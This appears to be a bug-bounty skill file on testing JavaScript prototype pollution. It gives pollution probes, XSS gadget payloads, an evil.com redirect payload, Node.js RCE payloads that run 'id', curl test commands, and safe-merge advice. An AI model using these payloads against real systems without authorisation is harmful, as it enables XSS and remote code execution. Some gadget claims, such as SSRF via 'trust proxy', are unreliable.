---
name: prototype-pollution
description: JavaScript prototype pollution testing: client-side to XSS, server-side to RCE, deep merge vulnerabilities, gadget chain construction.
---

# Prototype Pollution

## Overview

Prototype pollution is a JavaScript vulnerability where attacker-controlled properties are injected into Object.prototype, affecting all objects in the application. Can chain to XSS (client-side) or RCE (server-side/Node.js).

---

## Detection

### Basic Probe
```json
{"__proto__":{"polluted":"pp_test"}}
```
After sending, check if `{}.polluted === "pp_test"` in application context.

### Node.js Detection
```javascript
// If this returns "pp_test", prototype pollution exists
let obj = {};
console.log(obj.polluted); // should be undefined, "pp_test" if vulnerable
```

### URL-Based Detection
```
https://target.com/page?__proto__[polluted]=pp_test
```

---

## Client-Side → XSS

### Sink Functions (grep for these)
```javascript
// DANGEROUS - direct code execution
eval(objprop)
setTimeout(objprop, ...)
setInterval(objprop, ...)
new Function(objprop)()

// DOM XSS sinks
document.innerHTML = objprop
element.outerHTML = objprop
document.write(objprop)
location.href = objprop
window.open(objprop)
```

### Gadget Chains

#### jQuery + Prototype Pollution → XSS
```javascript
// If jQuery < 3.4.0 and a gadget like $.extend(true, ...) exists:
{"__proto__":{"html":"<img src=x onerror=alert(1)>","url":"javascript:alert(1)"}}
```

#### Client-Side Template Injection
```javascript
// If template uses obj[key] dynamically:
{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}
```

#### URL Redirection
```javascript
{"__proto__":{"redirect":"https://evil.com"}}
// If app does: window.location = user.redirect
```

---

## Server-Side → RCE (Node.js)

### merge() Function Vulnerability
```javascript
// VULNERABLE deep merge function:
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            target[key] = merge(target[key] || {}, source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Attack: pollute shelljs/execPath
{"__proto__":{"shelljs":"require('child_process').exec('id')"}}
```

### Child Process RCE
```javascript
// If app uses child_process with polluted config:
{"__proto__":{"execPath":"/bin/sh","execArgv":["-c","id"]}}
```

### Express.js RCE
```javascript
// If app uses express with polluted settings:
{"__proto__":{"trust proxy":true}}
// Can enable SSRF via X-Forwarded-For
```

---

## Deep Merge Vulnerabilities

### Common Vulnerable Patterns
```javascript
// Pattern 1: Recursive merge without prototype check
function merge(a, b) {
    for (let key in b) {
        if (typeof b[key] === 'object') {
            a[key] = merge(a[key] || {}, b[key]);
        } else {
            a[key] = b[key];
        }
    }
    return a;
}

// Pattern 2: Object.assign with user input
Object.assign({}, userInput)

// Pattern 3: Spread operator with user input
{...userInput}
```

### Safe Alternatives
```javascript
// Use null prototype objects
Object.create(null)

// Check for prototype keys
function safeMerge(target, source) {
    for (let key in source) {
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
            continue; // Skip dangerous keys
        }
        // ... merge logic
    }
}
```

---

## Testing Methodology

### Step 1: Find Injection Points
```
1. JSON body inputs (POST/PUT/PATCH)
2. URL query parameters
3. URL path segments
4. WebSocket messages
5. File uploads (JSON configs)
6. CLI arguments (if Node.js CLI tool)
```

### Step 2: Test for Pollution
```bash
# Test JSON body
curl -X POST https://target.com/api/update \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"test":"pp123"}}'

# Test query parameter
curl "https://target.com/page?__proto__[test]=pp123"

# Test nested pollution
curl -X POST https://target.com/api/update \
  -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"test":"pp123"}}}'
```

### Step 3: Check for Gadgets
```
1. Search JavaScript source for:
   - eval() with dynamic content
   - innerHTML/outerHTML assignment
   - document.write() with variables
   - Function() constructor
   - setTimeout/setInterval with strings
   - location.href/redirect with variables

2. Check server-side for:
   - child_process usage
   - exec/spawn with dynamic args
   - fs operations with dynamic paths
   - require() with dynamic modules
```

### Step 4: Chain to Impact
```
Prototype Pollution → XSS (client-side)
Prototype Pollution → RCE (server-side Node.js)
Prototype Pollution → SSRF (via trust proxy)
Prototype Pollution → DoS (via constructor.prototype)
```

---

## Tools

```bash
# Find prototype pollution in source code
grep -r "__proto__\|constructor\[" --include="*.js" --include="*.ts" .
grep -r "Object\.assign\|spread" --include="*.js" --include="*.ts" .

# Check for vulnerable merge functions
grep -r "\.extend\|merge\|deepMerge\|deepCopy" --include="*.js" .

# Automated scanning
nuclei -u https://target.com -t ~/nuclei-templates/dast/
```

---

## Impact Assessment

| Finding | Severity | Bounty Range |
|---------|----------|--------------|
| Client-side prototype pollution (no XSS) | Informational | $0-$100 |
| Client-side → XSS via gadget | Medium-High | $1,000-$5,000 |
| Server-side prototype pollution (no RCE) | Medium | $500-$2,000 |
| Server-side → RCE via pollution | Critical | $5,000-$15,000+ |
| SSRF via trust proxy pollution | High | $2,000-$5,000 |
